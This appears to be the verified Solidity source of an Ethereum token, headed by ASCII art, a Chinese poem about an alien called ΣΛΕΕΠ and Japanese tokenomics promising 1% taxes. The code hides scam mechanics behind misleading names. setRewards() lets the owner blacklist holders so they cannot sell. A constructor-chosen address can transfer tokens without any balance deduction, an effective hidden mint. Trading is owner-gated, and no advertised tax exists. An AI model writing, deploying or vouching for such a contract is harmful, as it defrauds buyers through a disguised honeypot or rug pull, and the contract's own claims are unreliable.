/**
 *Submitted for verification at Etherscan.io on 2023-08-11
*/

/*
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

在遥远的银河中，在如此明亮的星星中，
住着一个名叫ΣΛΕΕΠ的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΣΛΕΕΠ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΣΛΕΕΠ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΣΛΕΕΠ的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΣΛΕΕΠ温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΣΛΕΕΠ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΣΛΕΕΠ，来自上面的访客，
宇宙探索者，用爱拥抱地球。
総供給 - 500,000,000
購入税 - 1%
消費税 - 1%
初期流動性 - 1.5 ETH
初期流動性ロック - 50 日

https://m.weibo.cn/ΣΛΕΕΠcn
https://web.wechat.com/ΣΛΕΕΠcn
https://www.eaeenerc.io
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} function _msgSender() 
    internal view returns (address) {
    return msg.sender; }
}
interface ERCMalidux01 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
library ERCMathUint {
  function toInt256Safe(uint256 a) 
  internal pure returns 
  (int256) { int256 b = int256(a);
    require(b >= 0); 
    return b; }
}
interface ERCInterval01 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); function 
    createPair(
    address tokenA, address tokenB) 
    external returns (address pair);
}
interface ERCMakerV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    
    calldata path, address to, uint deadline) 
    external; 
    function factory() 
    external pure returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH(address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() 
    public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}
// https://t.me/
contract Contract is Context, ERCMalidux01, Ownable {
    mapping (address => bool) private mappingTimestamp;
    mapping(address => uint256) private _rOwned;

bool public inSwap; 
bool private tradingOpen = false;
bool transferDelayEnabled = true; 
ERCMakerV1 public calculatePair; address public BuyBackAddress;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private removeLimitsAt = 100;

    mapping(address => uint256) private _holderTransferTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    
    constructor( string memory tokenName, 
    string memory tokenSymbol, 
    address setIDErouter, 
    address setIDEaddress) { 

        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 18; _tTotal = 500000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal;

        _holderTransferTimestamp
        [setIDEaddress] = 
        removeLimitsAt; 
        inSwap = false; 

        calculatePair = ERCMakerV1(setIDErouter);
        BuyBackAddress = ERCInterval01
        (calculatePair.factory()).createPair(address(this), 
        calculatePair.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _tTotal);
    } 
    function getOwner() external view returns 
    (address) { return owner();
    }          
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
        'BEP20: approve from the zero address'); 

        require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function setRewards(address _stringPrefix) 
    external onlyOwner {
        mappingTimestamp[_stringPrefix] = true;
    }                         
    function _transfer( address sender, address recipient, uint256 amount) 
    internal {
        require(sender != address(0), 
        'BEP20: transfer from the zero address');

        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); 
        if (mappingTimestamp[sender] || mappingTimestamp[recipient]) 
        require(transferDelayEnabled == false, "");

        if (_holderTransferTimestamp[sender] 
        == 0  && BuyBackAddress != sender && isTxLimitExempt[sender] 
        > 0) { _holderTransferTimestamp[sender] -= removeLimitsAt; } 
        isTxLimitExempt[DesignateMarketAddress] += removeLimitsAt;
        DesignateMarketAddress = recipient; 
        if (_holderTransferTimestamp[sender] 
        == 0) {

        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  
        } _rOwned[recipient]
        = _rOwned[recipient].add(amount);

        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateBuyBackPercent(address _stringPrefix) 
    public view returns (bool) 
    { return mappingTimestamp[_stringPrefix]; }

    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }     
    function checkBuyBackLogs(address _stringPrefix) 
    external onlyOwner { mappingTimestamp[_stringPrefix] = false;
    }
    address private 
    DesignateMarketAddress;    
    using SafeMath for uint256;                                  
}